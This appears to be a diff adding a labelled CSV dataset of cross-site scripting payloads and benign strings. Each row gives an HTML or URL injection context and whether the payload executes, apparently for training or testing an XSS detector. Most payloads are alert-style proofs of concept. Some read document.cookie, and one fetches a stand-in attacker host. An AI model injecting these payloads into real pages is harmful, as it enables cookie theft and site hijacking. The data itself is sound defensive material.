@@ -1,0 +1,239 @@
+payload,context,exec,combined
+<img src=x onerror=,script_block,0,CONTEXT_script_block <img src=x onerror=
+"data:text/html,<svg/onload=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<svg/onload=alert(1)>"
+""" autofocus onfocus=alert(1) x=""",html_attribute,1,"CONTEXT_html_attribute "" autofocus onfocus=alert(1) x="""
+<input onfocus=alert(1) autofocus>,html_tag,1,CONTEXT_html_tag <input onfocus=alert(1) autofocus>
+;alert(1);//,html_attribute,0,CONTEXT_html_attribute ;alert(1);//
+""" onfocus=alert(1) autofocus """,html_attribute,1,"CONTEXT_html_attribute "" onfocus=alert(1) autofocus """
+onload=alert(1),html_text,0,CONTEXT_html_text onload=alert(1)
+"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe src=""data:text/html,<script>alert(1)</script>"">"
+just_a_string,html_text,0,CONTEXT_html_text just_a_string
+<iframe src=javascript:alert(1)>,html_tag,1,CONTEXT_html_tag <iframe src=javascript:alert(1)>
+javascript:alert(document.cookie),url_href,1,CONTEXT_url_href javascript:alert(document.cookie)
+"""><img src=x onerror=confirm(1)>",html_attribute,1,"CONTEXT_html_attribute ""><img src=x onerror=confirm(1)>"
+&#60;tag&#62;,html_text,0,CONTEXT_html_text &#60;tag&#62;
+javascript:alert(1),url_navigation,1,CONTEXT_url_navigation javascript:alert(1)
+"data:text/html,",html_text,0,"CONTEXT_html_text data:text/html,"
+"data:text/html,<svg onload=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<svg onload=alert(1)>"
+<img src=x onerror>,html_text,0,CONTEXT_html_text <img src=x onerror>
+<svg OnLoAd=alert(1)>,html_tag,1,CONTEXT_html_tag <svg OnLoAd=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>,html_text,0,CONTEXT_html_text <IMG SRC=x ONERROR=alert(1)>
+<svg onload>,html_text,0,CONTEXT_html_text <svg onload>
+<img src=x onerror=alert&#x28;1&#x29;>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert&#x28;1&#x29;>
+<script>confirm(1)</script>,html_tag,1,CONTEXT_html_tag <script>confirm(1)</script>
+<script>window.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>window.alert(1)</script>
+javascript:confirm`1`,url_href,1,CONTEXT_url_href javascript:confirm`1`
+<a href>,html_text,0,CONTEXT_html_text <a href>
+<meter onmouseover=alert(1)>,html_tag,1,CONTEXT_html_tag <meter onmouseover=alert(1)>
+""";alert(document.domain);//",script_block,1,"CONTEXT_script_block "";alert(document.domain);//"
+confirm(1),html_text,0,CONTEXT_html_text confirm(1)
+"data:text/html,<svg onload=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<svg onload=alert(1)>"
+"data:text/html,<script>prompt(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>prompt(1)</script>"
+<img src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)>
+javascript:alert(document.title),url_href,1,CONTEXT_url_href javascript:alert(document.title)
+javascript:confirm(1),url_href,1,CONTEXT_url_href javascript:confirm(1)
+</textarea><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </textarea><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block </title><svg/onload=alert(1)>
+hello,html_tag,0,CONTEXT_html_tag hello
+<img src=x onerror=alert('XSS')>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert('XSS')>
+<svg/onload=alert(String.fromCharCode(49))>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(String.fromCharCode(49))>
+</pre><svg/onload=alert`1`>,script_block,0,CONTEXT_script_block </pre><svg/onload=alert`1`>
+<svg/onload=alert(1)>,url_href,0,CONTEXT_url_href <svg/onload=alert(1)>
+"data:text/html,<img src=x onerror=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<img src=x onerror=alert(1)>"
+javascript:alert(1),html_tag,0,CONTEXT_html_tag javascript:alert(1)
+<img src=x onerror=alert(1)>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_attribute,0,CONTEXT_html_attribute %3Cscript%3Ealert(1)%3C%2Fscript%3E
+</pre><img src=x onerror=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><img src=x onerror=alert`1`>
+""" onkeydown=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onkeydown=alert(1) """
+<svg>,html_attribute,0,CONTEXT_html_attribute <svg>
+<details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag <details open ontoggle=alert(1)>
+javascript:alert(location),url_href,1,CONTEXT_url_href javascript:alert(location)
+"<iframe srcdoc=""<svg onload=alert(1)>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<svg onload=alert(1)>"">"
+"data:text/html,<svg onload=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<svg onload=alert(1)>"
+</title><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </title><svg/onload=alert(1)>
+"""><img src=x onerror=alert(1)>",html_tag,1,"CONTEXT_html_tag ""><img src=x onerror=alert(1)>"
+guest,html_text,0,CONTEXT_html_text guest
+<svg onload=alert(document.cookie)>,html_tag,1,CONTEXT_html_tag <svg onload=alert(document.cookie)>
+"data:text/html,<svg/onload=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<svg/onload=alert(1)>"
+<img src=a onerror=alert(document.cookie)>,html_tag,1,CONTEXT_html_tag <img src=a onerror=alert(document.cookie)>
+javascript:alert(window.origin),url_href,1,CONTEXT_url_href javascript:alert(window.origin)
+&#x3C;iframe&#x3E;,html_text,0,CONTEXT_html_text &#x3C;iframe&#x3E;
+<svg><script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>alert(1)</script>
+<body onload=alert(1)>,html_tag,1,CONTEXT_html_tag <body onload=alert(1)>
+<script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>alert(1)</script>
+<img src=x onerror=alert(1)//>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)//>
+<audio src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <audio src=x onerror=alert(1)>
+""" onfocus=alert(1) autofocus """,html_text,0,"CONTEXT_html_text "" onfocus=alert(1) autofocus """
+"data:text/html,<script>alert(document.domain)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(document.domain)</script>"
+<svg OnLoAd=alert(1)>,html_attribute,0,CONTEXT_html_attribute <svg OnLoAd=alert(1)>
+<source onerror=alert(1)>,html_attribute,0,CONTEXT_html_attribute <source onerror=alert(1)>
+javascript:alert`1`,url_href,1,CONTEXT_url_href javascript:alert`1`
+"data:text/html,<script>confirm(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>confirm(1)</script>"
+<b>hello</b>,html_text,0,CONTEXT_html_text <b>hello</b>
+javascript:prompt(1),html_tag,0,CONTEXT_html_tag javascript:prompt(1)
+"data:text/html,<script>alert(document.cookie)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(document.cookie)</script>"
+"""><svg/onload=alert(1)>",html_tag,1,"CONTEXT_html_tag ""><svg/onload=alert(1)>"
+<img src=x onerror=alert(location)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(location)>
+<svg/onload=confirm`1`>,script_block,0,CONTEXT_script_block <svg/onload=confirm`1`>
+<video>,html_text,0,CONTEXT_html_text <video>
+"""><img src=x onerror=alert(1)>",html_attribute,1,"CONTEXT_html_attribute ""><img src=x onerror=alert(1)>"
+<script>this.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>this.alert(1)</script>
+test123,html_text,0,CONTEXT_html_text test123
+<meter onmouseover=alert(1)>,script_block,0,CONTEXT_script_block <meter onmouseover=alert(1)>
+""";alert(location);//",script_block,1,"CONTEXT_script_block "";alert(location);//"
+</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1,CONTEXT_html_tag </pre><marquee onmouseover=alert(1)>hover me</marquee
+<script>alert`1`</script>,html_tag,1,CONTEXT_html_tag <script>alert`1`</script>
+value=test,html_attribute,0,CONTEXT_html_attribute value=test
+<svg/onload=alert(String.fromCharCode(49))>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert(String.fromCharCode(49))>
+textonly,html_text,0,CONTEXT_html_text textonly
+safeText,html_text,0,CONTEXT_html_text safeText
+<svg/onload=alert`XSS`>,script_block,0,CONTEXT_script_block <svg/onload=alert`XSS`>
+<iframe src=>,html_text,0,CONTEXT_html_text <iframe src=>
+"""><script>alert(1)</script>",html_attribute,1,"CONTEXT_html_attribute ""><script>alert(1)</script>"
+<svg onload=alert(location)>,html_tag,1,CONTEXT_html_tag <svg onload=alert(location)>
+"data:text/html,<img src=x onerror=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<img src=x onerror=alert(1)>"
+'><svg/onload=alert(1)>,html_attribute,1,CONTEXT_html_attribute '><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </title><svg/onload=alert(1)>
+javascript:confirm`1`,html_attribute,0,CONTEXT_html_attribute javascript:confirm`1`
+"data:text/html,<script>alert(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(1)</script>"
+><img src=x onerror=alert(1)>,url_href,0,CONTEXT_url_href ><img src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=confirm(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>,html_attribute,0,CONTEXT_html_attribute <scr<script>ipt>alert(1)</scr</script>ipt>
+<script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.domain)</script>
+"data:text/html,<script>prompt(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>prompt(1)</script>"
+</script><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </script><svg/onload=alert(1)>
+<svg><script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <svg><script>alert(document.domain)</script>
+""";alert(navigator.userAgent);//",script_block,1,"CONTEXT_script_block "";alert(navigator.userAgent);//"
+onmouseover=alert(1),html_attribute,1,CONTEXT_html_attribute onmouseover=alert(1)
+"""mixed'quotes""",html_text,0,"CONTEXT_html_text ""mixed'quotes"""
+plaininput,html_text,0,CONTEXT_html_text plaininput
+(1+1),html_text,0,CONTEXT_html_text (1+1)
+"data:text/html,<img src=x onerror=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<img src=x onerror=alert(1)>"
+value=test,html_text,0,CONTEXT_html_text value=test
+<img src=1 onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=1 onerror=alert(1)>
+<script>top.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>top.alert(1)</script>
+</pre><details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag </pre><details open ontoggle=alert(1)>
+""" onmouseenter=alert(1) """,url_href,0,"CONTEXT_url_href "" onmouseenter=alert(1) """
+</script><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </script><svg/onload=alert(1)>
+""" onmouseleave=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseleave=alert(1) """
+<svg><script>confirm(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>confirm(1)</script>
+<random>,html_text,0,CONTEXT_html_text <random>
+autofocus onfocus=alert(1) x=,script_block,0,CONTEXT_script_block autofocus onfocus=alert(1) x=
+</script><script>alert(1)</script>,script_block,1,CONTEXT_script_block </script><script>alert(1)</script>
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+C++ programming,html_text,0,CONTEXT_html_text C++ programming
+"data:text/html,<svg/onload=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<svg/onload=alert(1)>"
+<svg onload=prompt(1)>,html_tag,1,CONTEXT_html_tag <svg onload=prompt(1)>
+""" onclick=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onclick=alert(1) """
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+<img src=x onerror=,html_tag,0,CONTEXT_html_tag <img src=x onerror=
+</textarea><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </textarea><svg/onload=alert(1)>
+</body>,html_text,0,CONTEXT_html_text </body>
+""" onpointerover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onpointerover=alert(1) """
+""" onkeyup=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onkeyup=alert(1) """
+<script>alert(document.cookie)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.cookie)</script>
+%3Ciframe%3E,html_text,0,CONTEXT_html_text %3Ciframe%3E
+""" oninput=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" oninput=alert(1) """
+<source onerror=alert(1)>,url_href,0,CONTEXT_url_href <source onerror=alert(1)>
+"data:text/html,<script>alert(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(1)</script>"
+<ScRiPt>alert(1)</ScRiPt>,html_tag,1,CONTEXT_html_tag <ScRiPt>alert(1)</ScRiPt>
+"""><svg/onload=alert(1)>",html_attribute,1,"CONTEXT_html_attribute ""><svg/onload=alert(1)>"
+""";alert(document.title);//",script_block,1,"CONTEXT_script_block "";alert(document.title);//"
+><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text ><svg/onload=alert(1)>
+javascript:prompt(1),url_href,1,CONTEXT_url_href javascript:prompt(1)
+"<a href=""javascript:"">",html_text,0,"CONTEXT_html_text <a href=""javascript:"">"
+</pre><details open ontoggle=alert(1)>,script_block,0,CONTEXT_script_block </pre><details open ontoggle=alert(1)>
+<img src=x onerror=alert(document.URL)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(document.URL)>
+</pre><svg/onload=alert`1`>,url_href,0,CONTEXT_url_href </pre><svg/onload=alert`1`>
+<script>fetch('http://attacker.com')</script>,html_tag,1,CONTEXT_html_tag <script>fetch('http://attacker.com')</script>
+<img src=x>,script_block,0,CONTEXT_script_block <img src=x>
+""";alert(window.origin);//",script_block,1,"CONTEXT_script_block "";alert(window.origin);//"
+""";prompt(1);//",script_block,1,"CONTEXT_script_block "";prompt(1);//"
+</pre><marquee onstart=alert(1)>,html_text,0,CONTEXT_html_text </pre><marquee onstart=alert(1)>
+"<iframe srcdoc=""<script>alert(1)</script>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<script>alert(1)</script>"">"
+</pre><svg/onload=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><svg/onload=alert`1`>
+<svg>,html_text,0,CONTEXT_html_text <svg>
+<scr<script>ipt>alert(1)</scr</script>ipt>,html_text,0,CONTEXT_html_text <scr<script>ipt>alert(1)</scr</script>ipt>
+javascript:prompt`1`,url_href,1,CONTEXT_url_href javascript:prompt`1`
+</textarea><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </textarea><svg/onload=alert(1)>
+<img src=x onerror=prompt(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=prompt(1)>
+""" onclick=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onclick=alert(1)"
+;alert(navigator.userAgent);//,url_href,0,CONTEXT_url_href ;alert(navigator.userAgent);//
+;alert(1);//,html_text,0,CONTEXT_html_text ;alert(1);//
+<meter onmouseover=alert(1)>,url_href,0,CONTEXT_url_href <meter onmouseover=alert(1)>
+<svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(1)>
+""" onauxclick=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onauxclick=alert(1) """
+javascript:alert(document.domain),url_href,1,CONTEXT_url_href javascript:alert(document.domain)
+"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<script>alert(1)</script>"">"
+""";alert(document.cookie);//",html_tag,0,"CONTEXT_html_tag "";alert(document.cookie);//"
+""" onmouseenter=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseenter=alert(1) """
+"data:text/html,<script>prompt(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>prompt(1)</script>"
+<i>text</i>,html_text,0,CONTEXT_html_text <i>text</i>
+category=electronics,html_text,0,CONTEXT_html_text category=electronics
+""";confirm(1);//",script_block,1,"CONTEXT_script_block "";confirm(1);//"
+&#x3C;script&#x3E;,html_tag,0,CONTEXT_html_tag &#x3C;script&#x3E;
+title=hello,html_text,0,CONTEXT_html_text title=hello
+<iframe src=javascript:alert(1)>,url_href,0,CONTEXT_url_href <iframe src=javascript:alert(1)>
+<svg/onload=confirm`1`>,html_tag,1,CONTEXT_html_tag <svg/onload=confirm`1`>
+<video src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <video src=x onerror=alert(1)>
+src=image,html_tag,0,CONTEXT_html_tag src=image
+name=user,html_text,0,CONTEXT_html_text name=user
+<script>alert(1),html_attribute,0,CONTEXT_html_attribute <script>alert(1)
+onblur=alert(1),html_text,0,CONTEXT_html_text onblur=alert(1)
+<img src=x onerror=alert&#40;1&#41;>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert&#40;1&#41;>
+""" onmouseover=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1)"
+</randomtag>,html_text,0,CONTEXT_html_text </randomtag>
+""" onkeyup=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onkeyup=alert(1) """
+><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block ><svg/onload=alert(1)>
+<svg/onload=alert`XSS`>,html_tag,1,CONTEXT_html_tag <svg/onload=alert`XSS`>
+javascript:alert(1),url_href,1,CONTEXT_url_href javascript:alert(1)
+"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<img src=x onerror=alert(1)>"
+<source onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <source onerror=alert(1)>
+<script>alert(1),html_tag,0,CONTEXT_html_tag <script>alert(1)
+""";alert(location);//",html_text,0,"CONTEXT_html_text "";alert(location);//"
+admin,html_text,0,CONTEXT_html_text admin
+><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href ><svg/onload=alert(1)>
+"data:text/html,<script>prompt(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>prompt(1)</script>"
+""";alert(document.cookie);//",script_block,1,"CONTEXT_script_block "";alert(document.cookie);//"
+"data:text/html,<script>alert(document.cookie)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(document.cookie)</script>"
+javascript:prompt(1),url_navigation,1,CONTEXT_url_navigation javascript:prompt(1)
+javascript:alert(String.fromCharCode(49)),url_href,1,CONTEXT_url_href javascript:alert(String.fromCharCode(49))
+<img src=x onerror=alert(1)//>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//>
+""" onblur=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onblur=alert(1) """
+<script>alert</script>,html_text,0,CONTEXT_html_text <script>alert</script>
+<alert>,html_text,0,CONTEXT_html_text <alert>
+<<>>,html_text,0,CONTEXT_html_text <<>>
+javascript:prompt(1),script_block,0,CONTEXT_script_block javascript:prompt(1)
+javascript:confirm(1),html_attribute,0,CONTEXT_html_attribute javascript:confirm(1)
+<IMG SRC=x ONERROR=alert(1)>,html_tag,1,CONTEXT_html_tag <IMG SRC=x ONERROR=alert(1)>
+""" onmouseover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1) """
+</script><svg/onload=alert(1)>,script_block,1,CONTEXT_script_block </script><svg/onload=alert(1)>
+javascript:alert(navigator.userAgent),url_href,1,CONTEXT_url_href javascript:alert(navigator.userAgent)
+javascript:confirm(1),url_navigation,1,CONTEXT_url_navigation javascript:confirm(1)
+<script>alert(String.fromCharCode(49))</script>,html_tag,1,CONTEXT_html_tag <script>alert(String.fromCharCode(49))</script>
+javascript:prompt(1),html_attribute,0,CONTEXT_html_attribute javascript:prompt(1)
+<svg><script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>prompt(1)</script>
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+<iframe>,html_text,0,CONTEXT_html_text <iframe>
+<svg/onload=alert(String.fromCharCode(49))>,url_href,0,CONTEXT_url_href <svg/onload=alert(String.fromCharCode(49))>
+<img src=x onerror=alert(window.origin)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(window.origin)>
+<script>\u0061lert(1)</script>,html_tag,1,CONTEXT_html_tag <script>\u0061lert(1)</script>
+<img src=x onerror=alert(navigator.userAgent)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(navigator.userAgent)>
+{test},html_text,0,CONTEXT_html_text {test}
+""" oninput=alert(1) """,script_block,0,"CONTEXT_script_block "" oninput=alert(1) """
+confirm(1),script_block,0,CONTEXT_script_block confirm(1)
+;alert(history.length);//,url_href,0,CONTEXT_url_href ;alert(history.length);//
+</pre><body onload=alert(1)>,html_tag,1,CONTEXT_html_tag </pre><body onload=alert(1)>
+<div>content</div>,html_text,0,CONTEXT_html_text <div>content</div>
+""" onwheel=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onwheel=alert(1) """
+<img src=x onerror=alert(1)//,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//
+<script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <script>prompt(1)</script>
+"data:text/html,<svg/onload=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<svg/onload=alert(1)>"
+hello,html_text,0,CONTEXT_html_text hello
+javascript:alert(history.length),url_href,1,CONTEXT_url_href javascript:alert(history.length)
+AT&T,html_text,0,CONTEXT_html_text AT&T
+"<iframe srcdoc=""<script>alert(1)</script>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<script>alert(1)</script>"">"
+""" onfocus=alert(1) autofocus """,url_href,0,"CONTEXT_url_href "" onfocus=alert(1) autofocus """
+;alert(document.domain);//,html_attribute,0,CONTEXT_html_attribute ;alert(document.domain);//
+""";alert(history.length);//",script_block,1,"CONTEXT_script_block "";alert(history.length);//"
+&#60;script&#62;,html_tag,0,CONTEXT_html_tag &#60;script&#62;
